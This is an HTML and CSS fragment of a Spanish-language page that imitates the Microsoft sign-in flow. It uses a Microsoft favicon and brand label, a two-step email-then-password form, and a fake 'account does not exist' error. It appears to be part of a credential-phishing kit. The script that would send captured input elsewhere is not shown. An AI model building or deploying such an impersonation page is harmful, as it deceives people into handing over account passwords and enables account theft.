  <style type="text/css">
    textarea:hover, 
input:hover, 
textarea:active, 
input:active, 
textarea:focus, 
input:focus,
button:focus,
button:active,
button:hover,
label:focus,
.btn:active,
.btn.active
{
    outline:0px !important;
    -webkit-appearance:none;
    box-shadow: none !important;
}

    .box
    {
      box-shadow: 0 2px 3px rgba(0,0,0,0.55);
      border: 1px solid rgba(0,0,0,0.4);
      min-height: 338px;
      min-width: 320px;
      max-width: 440px;
      width: calc(100% - 40px);
      padding: 44px;
      margin-left: auto;
      margin-right: auto;
      margin-top: 20px;
      margin-bottom: 28px;
    }

    #footer {
      position: fixed;
      bottom: 0px;
      width: 100%;
      overflow: visible;
      z-index: 99;
      clear: both;
      background-color: #000;
      background-color: rgba(0,0,0,0.6);
    }

    /*.footerNode span {
    color: #fff;

}*/
div .footerNode a, div .footerNode span {
    color: #fff;
    font-size: 0.75rem;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    float: right;
    margin-left: 8px;
    margin-right: 8px;
}
    @media only screen and (max-width: 610px) {
      #hide{
        display: none;
      }
    }

          <div class="col-lg-6 mx-auto">
            <div class="bg-white box" id="div1">

              <span class="h5">Por favor revise el correo electrónico para continuar</span><br>
              <span id="error" class="text-danger" style="display: none;">Esa cuenta de Microsoft no existe. Ingresa una cuenta diferente</span>
              

<div class="form-group mt-2">
                <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" 
value="" aria-describedby="emailHelp" placeholder="Correo electrónico, teléfono o skype" 
style="border-right: none;border-left: none;border-top: none;">
              </div>


              <p><a href="#"></a></p>
              
                <div class="text-right">
                  <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Log in</button>
                </div>
              </div>

              <div class="m-5 p-4 bg-white box" id="div2" style="display: none;">
                <form id="contact">
                  <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>

                  <div class="form-group mt-2">
                    <input type="password" name="password" class="form-control rounded-0 border-dark" id="password" aria-describedby="emailHelp" placeholder="Contraseña" style="border-right: none;border-left: none;border-top: none;">
                  </div>
                  <p><a href="#"></a></p>
                  
                  <div class="text-right">
                    <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;" >Acceso</button>
                  </div>
                </form>
              </div>

            </div>
